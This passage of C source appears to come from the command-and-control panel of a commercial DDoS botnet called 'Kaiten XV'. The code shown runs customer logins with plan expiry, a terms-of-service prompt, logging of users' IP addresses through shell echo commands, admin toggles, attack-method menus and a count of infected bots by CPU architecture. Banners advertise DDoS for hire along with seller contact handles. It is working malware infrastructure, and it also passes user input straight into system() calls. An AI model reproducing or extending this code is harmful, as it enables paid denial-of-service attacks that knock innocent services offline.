			sprintf(tos4,  "\t\e[1;36m      ║\e[1;37mYou Are Not Allowed To Share Your Kaiten Account  \e[1;36m║ \r\n"); 
			sprintf(tos5,  "\t\e[1;36m      ║\e[1;37mYou Are Not Allowed To Share Kaiten XV Details    \e[1;36m║\r\n"); 
			sprintf(tos6,  "\t\e[1;36m      ║\e[1;37mDDoS'ing Dstats Without Supervison Isn't Allowed  \e[1;36m║\r\n"); 
			sprintf(tos7,  "\t\e[1;36m      ║\e[1;37mRefunds Are Not Available(Due To Buyer Protection)\e[1;36m║ \r\n"); 
			sprintf(tos8,  "\t\e[1;36m   ╔══╝                                                  ╚══╗ \r\n"); 
			sprintf(tos9,  "\t\e[1;36m   ╚════════════════════════════════════════════════════════╝\r\n"); 
			sprintf(tos10, "\t\e[1;37m              Discord: gafgyt_ / jomarvpn \r\n"); 
			sprintf(tos11, "\t\e[1;37m              Instagram: pizonurgrave / 11xrvt\r\n"); 
						
			if(send(datafd, tos0, strlen(tos0), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos1, strlen(tos1), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos2, strlen(tos2), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos3, strlen(tos3), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos4, strlen(tos4), MSG_NOSIGNAL) == -1) goto  end;
			if(send(datafd, tos6, strlen(tos6), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos7, strlen(tos7), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos8, strlen(tos8), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos9, strlen(tos9), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos10, strlen(tos10), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos11, strlen(tos11), MSG_NOSIGNAL) == -1) goto end;

			sprintf(usethis, "\r\n \e[1;35mDo You Agree With The TOS \033[92m[\e[97mYes\e[38;5;45m or \e[97mNo\033[92m]:\033[97m");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0,sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) > 1);
			trim(buf);

			if(strcasestr(buf, "Yes") || strcasestr(buf, "y"))
			{
				char sendtos[8000];
				char log1[800];
				sprintf(sendtos, "echo '%s Accepted TOS!' >> logs/AcceptedTos.txt", nickstring);
				system(sendtos);
				sprintf(log1, "echo '%s IP: %s' >> logs/LoggedUsers.txt", nickstring, ipinfo);
				system(log1);
				memset(nickstring, 0, sizeof(nickstring));
				sleep(2);
				loggedin = 0;
				goto Banner;
			} else 
			{
				sprintf(usethis, "\e[1;37m──────────────────────────────────────────────\r\n\e[1;31mYou Did NOT Accept The TOS! You Are Being Kicked\r\n\e[1;37m──────────────────────────────────────────────\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				memset(nickstring, 0, sizeof(nickstring));
				goto end;
			}

            }
        }

            failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			sprintf(usethis, "\e[1;37m──────────────────────────────────────────────────\r\n\e[1;31mYou Have Failed Your Login Please Try Again...\r\n\e[1;37m──────────────────────────────────────────────────\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	goto end;

        Banner:

        strcpy(accounts[datafd].expirydate, accounts[find_line].expirydate);
        if(check_expiry(datafd) == 1)
        {
            sprintf(clearscreen, "\033[2J\033[1;1H");    
            if(send(datafd, clearscreen,  strlen(clearscreen),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, "\e[1;35mYour Plan On Kaiten-XV Has Expired\r\n", strlen("\e[1;36mYour Plan On Kaiten-XV Has Expired\r\n"), MSG_NOSIGNAL); // now
            sleep(5);
            goto end;
        }
        gay[datafd].login = 0;
		pthread_create(&title, NULL, &TitleWriter, sock);
		         
		  char ktn_banner0   [5000];
          char ktn_banner1   [5000];
          char ktn_banner2   [5000];
          char ktn_banner3   [5000];
          char ktn_banner4   [5000];
          char ktn_banner5   [5000];
          char ktn_banner6   [5000];
          char ktn_banner7   [5000];
          char ktn_banner8   [5000];
          char ktn_banner9   [5000];
          char ktn_bannera   [5000];
          char ktn_bannerb   [5000];
     	  char *userlog  [800];

 char hostbuffer[256]; 
    int hostname; 
    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    checkHostName(hostname); 
 				if(!strcmp(accounts[find_line].admin, "admin")) 
 				{
 					managements[datafd].adminstatus = 1;
 				}

                char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");	
				sprintf(managements[datafd].my_ip, "%s", ipinfo);
				sprintf(managements[datafd].id, "%s", accounts[find_line].username);
				sprintf(managements[datafd].planname, "%s", accounts[find_line].admin);
				managements[datafd].mycooldown = accounts[find_line].cooldown;
				managements[datafd].mymaxtime = accounts[find_line].maxtime;

				int loginshit;
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						sprintf(usethis, "\r\n%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						gay[datafd].just_logged_in = 3;
					}
				}

        main_banner:

				memset(ipinfo, 0, sizeof(ipinfo));			
				if(motdaction == 1)
				sprintf(ktn_banner0,  "\e[1;36mUpdates:\e[1;37m %s\r\n", motd); 
                sprintf(ktn_banner1,  "        \e[38;2;125;125;255m                 ╦\e[38;2;135;135;240m╔\e[38;2;145;145;220m═\e[38;2;155;155;200m╔\e[38;2;165;165;180m═\e[38;2;175;175;160m╗\e[38;2;185;185;140m╦\e[38;2;195;195;120m╔\e[38;2;205;205;100m╦\e[38;2;215;215;80m╗\e[38;2;225;225;60m╔\e[38;2;235;235;40m═\e[38;2;245;245;20m╗╔╗╔         \r\n");  
                sprintf(ktn_banner2,  "        \e[38;2;125;125;255m                 ╠\e[38;2;135;135;240m╩\e[38;2;145;145;220m╗\e[38;2;155;155;200m╠\e[38;2;165;165;180m═\e[38;2;175;175;160m╣\e[38;2;185;185;140m║\e[38;2;195;195;120m \e[38;2;205;205;100m║\e[38;2;215;215;80m \e[38;2;225;225;60m║\e[38;2;235;235;40m╣\e[38;2;245;245;20m ║║║   \r\n");
                sprintf(ktn_banner3,  "        \e[38;2;125;125;255m                 ╩\e[38;2;135;135;240m \e[38;2;145;145;220m╩\e[38;2;155;155;200m╩\e[38;2;165;165;180m \e[38;2;175;175;160m╩\e[38;2;185;185;140m╩\e[38;2;195;195;120m \e[38;2;205;205;100m╩\e[38;2;215;215;80m \e[38;2;225;225;60m╚\e[38;2;235;235;40m═\e[38;2;245;245;20m╝╝╚╝ 𝘟𝘝    \r\n");
                sprintf(ktn_banner4,  "        \e[38;2;125;125;255m          ╔\e[38;2;135;135;240m══\e[38;2;145;145;220m══\e[38;2;155;155;200m══\e[38;2;165;165;180m══\e[38;2;175;175;160m══\e[38;2;185;185;140m══\e[38;2;195;195;120m══\e[38;2;205;205;100m══\e[38;2;215;215;80m═══\e[38;2;225;225;60m══\e[38;2;235;235;40m═══\e[38;2;245;245;20m═════╗                              \r\n");
                sprintf(ktn_banner5,  "        \e[38;2;125;125;255m          ║\e[38;2;135;135;240m  \e[38;2;145;145;220m  \e[38;2;155;155;200mWe\e[38;2;165;165;180mlc\e[38;2;175;175;160mom\e[38;2;185;185;140me \e[38;2;195;195;120mTo\e[38;2;205;205;100m K\e[38;2;215;215;80mait\e[38;2;225;225;60men\e[38;2;235;235;40m XV\e[38;2;245;245;20m     ║                              \r\n");
                sprintf(ktn_banner6,  "        \e[38;2;125;125;255m       ╔══╝\e[38;2;135;135;240m  \e[38;2;145;145;220m  \e[38;2;155;155;200m R\e[38;2;165;165;180man\e[38;2;175;175;160m O\e[38;2;185;185;140mn \e[38;2;195;195;120mTr\e[38;2;205;205;100mue\e[38;2;215;215;80m Po\e[38;2;225;225;60mwe\e[38;2;235;235;40mr. \e[38;2;245;245;20m     ╚══╗                           \r\n");
                sprintf(ktn_banner7,  "        \e[38;2;125;125;255m     ╔═╣Kai\e[38;2;135;135;240mte\e[38;2;145;145;220mn \e[38;2;155;155;200mC2\e[38;2;165;165;180m, \e[38;2;175;175;160mA \e[38;2;185;185;140mSo\e[38;2;195;195;120mur\e[38;2;205;205;100mce\e[38;2;215;215;80m Co\e[38;2;225;225;60mde\e[38;2;235;235;40md b\e[38;2;245;245;20my Komodo╠═╗                         \r\n");
                sprintf(ktn_banner8,  "        \e[38;2;125;125;255m     ║ ╚═══\e[38;2;135;135;240m══\e[38;2;145;145;220m══\e[38;2;155;155;200m══\e[38;2;165;165;180m══\e[38;2;175;175;160m══\e[38;2;185;185;140m══\e[38;2;195;195;120m══\e[38;2;205;205;100m══\e[38;2;215;215;80m═══\e[38;2;225;225;60m══\e[38;2;235;235;40m═══\e[38;2;245;245;20m════════╝ ║                         \r\n");      
                sprintf(ktn_banner9,  "        \e[38;2;125;125;255m╔════╩═════\e[38;2;135;135;240m══\e[38;2;145;145;220m══\e[38;2;155;155;200m══\e[38;2;165;165;180m══\e[38;2;175;175;160m══\e[38;2;185;185;140m══\e[38;2;195;195;120m══\e[38;2;205;205;100m══\e[38;2;215;215;80m═══\e[38;2;225;225;60m══\e[38;2;235;235;40m═══\e[38;2;245;245;20m══════════╩════╗                    \r\n");
                sprintf(ktn_bannera,  "        \e[38;2;125;125;255m║Copyright \e[38;2;135;135;240m© \e[38;2;145;145;220m20\e[38;2;155;155;200m23\e[38;2;165;165;180m K\e[38;2;175;175;160mai\e[38;2;185;185;140mte\e[38;2;195;195;120mn \e[38;2;205;205;100mlt\e[38;2;215;215;80md. \e[38;2;225;225;60mAl\e[38;2;235;235;40ml R\e[38;2;245;245;20mights Reserved ║                    \r\n");
                sprintf(ktn_bannerb,  "        \e[38;2;125;125;255m╚══════════\e[38;2;135;135;240m══\e[38;2;145;145;220m══\e[38;2;155;155;200m══\e[38;2;165;165;180m══\e[38;2;175;175;160m══\e[38;2;185;185;140m══\e[38;2;195;195;120m══\e[38;2;205;205;100m══\e[38;2;215;215;80m═══\e[38;2;225;225;60m══\e[38;2;235;235;40m═══\e[38;2;245;245;20m═══════════════╝                    \r\n");
                if(send(datafd, clearscreen1,  strlen(clearscreen1),	MSG_NOSIGNAL) == -1) goto end;				
				if(strlen(motd) > 1){
				if(send(datafd, ktn_banner0,  strlen(ktn_banner0),	MSG_NOSIGNAL) == -1) goto end;
				}
				if(send(datafd, ktn_banner1,  strlen(ktn_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner2,  strlen(ktn_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, ktn_banner3,  strlen(ktn_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner4,  strlen(ktn_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner5,  strlen(ktn_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner6,  strlen(ktn_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner7,  strlen(ktn_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner8,  strlen(ktn_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner9,  strlen(ktn_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannera,  strlen(ktn_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannerb,  strlen(ktn_bannerb),	MSG_NOSIGNAL) == -1) goto end;
           
		while(1) {
		char input [5000];
        sprintf(input, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   

      if(strcasestr(buf, "help") || strcasestr(buf, "info")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, ktn_banner1,  strlen(ktn_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner2,  strlen(ktn_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, ktn_banner3,  strlen(ktn_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner4,  strlen(ktn_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner5,  strlen(ktn_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner6,  strlen(ktn_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner7,  strlen(ktn_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner8,  strlen(ktn_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner9,  strlen(ktn_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannera,  strlen(ktn_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannerb,  strlen(ktn_bannerb),	MSG_NOSIGNAL) == -1) goto end;

                char help0  [800];
				char help1  [800];
				char help2  [800];
				char help3  [800];
				char help4  [800];
				char help5  [800];
				char help6  [800];
				char help7  [800];
				char help8  [800];
				char help9  [800];
				char help10  [800];
				char help11  [800];
				char help12  [800];
				char help13  [800];
				
				sprintf(help0,   "\r\n");
				sprintf(help1,   "\e[38;2;245;245;20m ╔═\e[38;2;235;235;40m═══\e[38;2;225;225;60m═══\e[38;2;215;215;80m══\e[38;2;205;205;100m═╦\e[38;2;195;195;120m══\e[38;2;185;185;140m══\e[38;2;175;175;160m══\e[38;2;165;165;180m══\e[38;2;155;155;200m═══\e[38;2;145;145;220m═══\e[38;2;135;135;240m═════\e[38;2;125;125;255m════════════════╗\r\n");
                sprintf(help2,   "\e[38;2;245;245;20m ║ M\e[38;2;235;235;40meth\e[38;2;225;225;60mods\e[38;2;215;215;80m  \e[38;2;205;205;100m║ \e[38;2;195;195;120mSh\e[38;2;185;185;140mow\e[38;2;175;175;160ms \e[38;2;165;165;180mAl\e[38;2;155;155;200ml C\e[38;2;145;145;220mate\e[38;2;135;135;240mgorie\e[38;2;125;125;255ms Of Methods   ║\r\n");             
				sprintf(help3,   "\e[38;2;245;245;20m ║ Bo\e[38;2;235;235;40mts \e[38;2;225;225;60m   \e[38;2;215;215;80m ║\e[38;2;205;205;100m S\e[38;2;195;195;120mho\e[38;2;185;185;140mws\e[38;2;175;175;160m T\e[38;2;165;165;180mhe\e[38;2;155;155;200m Bo\e[38;2;145;145;220mt/S\e[38;2;135;135;240merver\e[38;2;125;125;255m Count        ║\r\n");             
				sprintf(help4,   "\e[38;2;245;245;20m ║ Adm\e[38;2;235;235;40min \e[38;2;225;225;60m   \e[38;2;215;215;80m║ \e[38;2;205;205;100mSh\e[38;2;195;195;120mow\e[38;2;185;185;140ms \e[38;2;175;175;160mAl\e[38;2;165;165;180ml \e[38;2;155;155;200mAdm\e[38;2;145;145;220min \e[38;2;135;135;240mComma\e[38;2;125;125;255mnds          ║\r\n");             
    		    sprintf(help5,   "\e[38;2;245;245;20m ║ Tick\e[38;2;235;235;40met \e[38;2;225;225;60m  ║\e[38;2;215;215;80m O\e[38;2;205;205;100mpe\e[38;2;195;195;120mn \e[38;2;185;185;140mA \e[38;2;175;175;160mTi\e[38;2;165;165;180mck\e[38;2;155;155;200met \e[38;2;145;145;220mFor\e[38;2;135;135;240m Supp\e[38;2;125;125;255mort         ║\r\n");             
    		    sprintf(help6,   "\e[38;2;245;245;20m ║ Cls  \e[38;2;235;235;40m   \e[38;2;225;225;60m ║ \e[38;2;215;215;80mCl\e[38;2;205;205;100mea\e[38;2;195;195;120mrs\e[38;2;185;185;140m Y\e[38;2;175;175;160mou\e[38;2;165;165;180mr \e[38;2;155;155;200mTer\e[38;2;145;145;220mmin\e[38;2;135;135;240mal Sc\e[38;2;125;125;255mreen       ║\r\n");             
    		    sprintf(help7,   "\e[38;2;245;245;20m ║ Extra \e[38;2;235;235;40m   \e[38;2;225;225;60m║ S\e[38;2;215;215;80mho\e[38;2;205;205;100mws\e[38;2;195;195;120m A\e[38;2;185;185;140mll\e[38;2;175;175;160m E\e[38;2;165;165;180mxt\e[38;2;155;155;200mra \e[38;2;145;145;220mKai\e[38;2;135;135;240mten X\e[38;2;125;125;255mV Commands║\r\n");             
    		    sprintf(help8,   "\e[38;2;245;245;20m ║ STOP   \e[38;2;235;235;40m  ║\e[38;2;225;225;60m St\e[38;2;215;215;80mop\e[38;2;205;205;100ms \e[38;2;195;195;120mYo\e[38;2;185;185;140mur\e[38;2;175;175;160m A\e[38;2;165;165;180mtt\e[38;2;155;155;200mack\e[38;2;145;145;220ms  \e[38;2;135;135;240m     \e[38;2;125;125;255m         ║\r\n");             
                sprintf(help9,   "\e[38;2;245;245;20m ╚═════════\e[38;2;235;235;40m═╩═\e[38;2;225;225;60m═══\e[38;2;215;215;80m══\e[38;2;205;205;100m══\e[38;2;195;195;120m══\e[38;2;185;185;140m══\e[38;2;175;175;160m══\e[38;2;165;165;180m══\e[38;2;155;155;200m═══\e[38;2;145;145;220m═══\e[38;2;135;135;240m═════\e[38;2;125;125;255m════════╝\r\n");             
                sprintf(help10,  "\e[38;2;245;245;20m  ╔\e[38;2;235;235;40m══\e[38;2;225;225;60m══\e[38;2;215;215;80m══\e[38;2;205;205;100m══\e[38;2;195;195;120m══\e[38;2;185;185;140m══\e[38;2;175;175;160m══\e[38;2;165;165;180m══\e[38;2;155;155;200m══       \e[38;2;145;145;220m══\e[38;2;135;135;240m══\e[38;2;125;125;255m═══════════════╗\r\n");             
                sprintf(help11,  "\e[1;37m    Welcome To Kaiten XV, DDoS With True Power   \r\n");             
                sprintf(help12,  "\e[38;2;245;245;20m  ╚\e[38;2;235;235;40m══\e[38;2;225;225;60m══\e[38;2;215;215;80m══\e[38;2;205;205;100m══\e[38;2;195;195;120m══\e[38;2;185;185;140m══\e[38;2;175;175;160m══\e[38;2;165;165;180m══\e[38;2;155;155;200m══       \e[38;2;145;145;220m══\e[38;2;135;135;240m══\e[38;2;125;125;255m═══════════════╝\r\n");

                if(send(datafd, help0,  strlen(help0),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help5,  strlen(help5),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help6,  strlen(help6),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help7,  strlen(help7),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help8,  strlen(help8),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help9,  strlen(help9),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help10,  strlen(help10),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help11,  strlen(help11),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help12,  strlen(help12),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto Banner;
				continue;
 		}

 		if(strstr(buf, "captcha on") && managements[datafd].adminstatus == 1)   //if(managements[datafd].adminstatus == 1)
        {
            captcano = 1;
        }
        if(strstr(buf, "captcha off") && managements[datafd].adminstatus == 1)
        {
            captcano = 0;
        }
        if(strstr(buf, "trigger on") && managements[datafd].adminstatus == 1)
        {
            logintrigger = 1;
        }
        if(strstr(buf, "trigger off") && managements[datafd].adminstatus == 1)
        {
            logintrigger = 0;
        }


if(strcasestr(buf, "methods"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
    
    const char *filename = AttackStatus == 0 ? "/root/banners/attacks_enabled.txt" : "/root/banners/attacks_disabled.txt";
    FILE *file = fopen(filename, "r");
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Buffer for reading each line from the file.
    char processed_line[2048]; // Buffer for the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        // Replace [ESC] with the actual escape character
        char *src = line;
        char *dst = processed_line;
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        ssize_t bytes_sent = send(datafd, processed_line, dst - processed_line, MSG_NOSIGNAL);
        if(bytes_sent == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
        fsync(datafd); // Ensure the data is sent immediately
    }

    fclose(file); // Close the file after reading all lines.

    // Start the title thread, if needed
    pthread_create(&title, NULL, &TitleWriter, sock);
}



		if (strcasestr(buf, "bots") || strcasestr(buf, "roots")) {
            char synpur1[128];
            char synpur2[128];
            char synpur3[128];
            char synpur4[128];
            char synpur5[128];
            char synpur6[128];
            char synpur7[128];
            char synpur8[128];

	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, ktn_banner1,  strlen(ktn_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner2,  strlen(ktn_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, ktn_banner3,  strlen(ktn_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner4,  strlen(ktn_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner5,  strlen(ktn_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner6,  strlen(ktn_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner7,  strlen(ktn_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner8,  strlen(ktn_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner9,  strlen(ktn_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannera,  strlen(ktn_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannerb,  strlen(ktn_bannerb),	MSG_NOSIGNAL) == -1) goto end;
	  sprintf(synpur8, "\e[1;35mCount\e[1;36m: \e[1;37m[\e[1;35m%d\e[1;37m] \r\n",  botsconnect());
      if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;

            if(x86Connected() != 0)// should i add u in this call ye
            {
                sprintf(synpur1,"\e[1;35mx86: [\e[1;36m%d\e[1;35m] \r\n",     x86Connected());
                if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(synpur2,"\e[1;35mArm: [\e[1;36m%d\e[1;35m] \r\n",     armConnected());
                if(send(datafd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(synpur3,"\e[1;35mMips: [\e[1;36m%d\e[1;35m] \r\n",     mipsConnected());
                if(send(datafd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mpslConnected() != 0)
            {
                sprintf(synpur4,"\e[1;35mMpsl: [\e[1;36m%d\e[1;35m] \r\n",     mpslConnected());
                if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(synpur5,"\e[1;35mPpc: [\e[1;36m%d\e[1;35m] \r\n",     ppcConnected());
                if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(spcConnected() != 0)
            {
                sprintf(synpur6,"\e[1;35mSpc: [\e[1;36m%d\e[1;35m] \r\n",     spcConnected());
                if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unknownConnected() != 0)
            {
                sprintf(synpur7,"\e[1;35mUnknown: [\e[1;36m%d\e[1;35m] \r\n",     unknownConnected());
                if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
            }

            
			pthread_create(&title, NULL, &TitleWriter, sock);
		
			}
			

if(strcasestr(buf, "extra"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/extra.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}


/*
\e[38;2;255;0;211m

\e[38;2;227;27;216m

\e[38;2;199;53;221m

\e[38;2;171;80;226m

\e[38;2;143;106;231m

\e[38;2;116;133;235m
*/
if(strcasestr(buf, "normal"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/attacks_normal.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}


if(strcasestr(buf, "l7"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/attacks_l7.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}

if(strcasestr(buf, "vip"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/attacks_vip.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
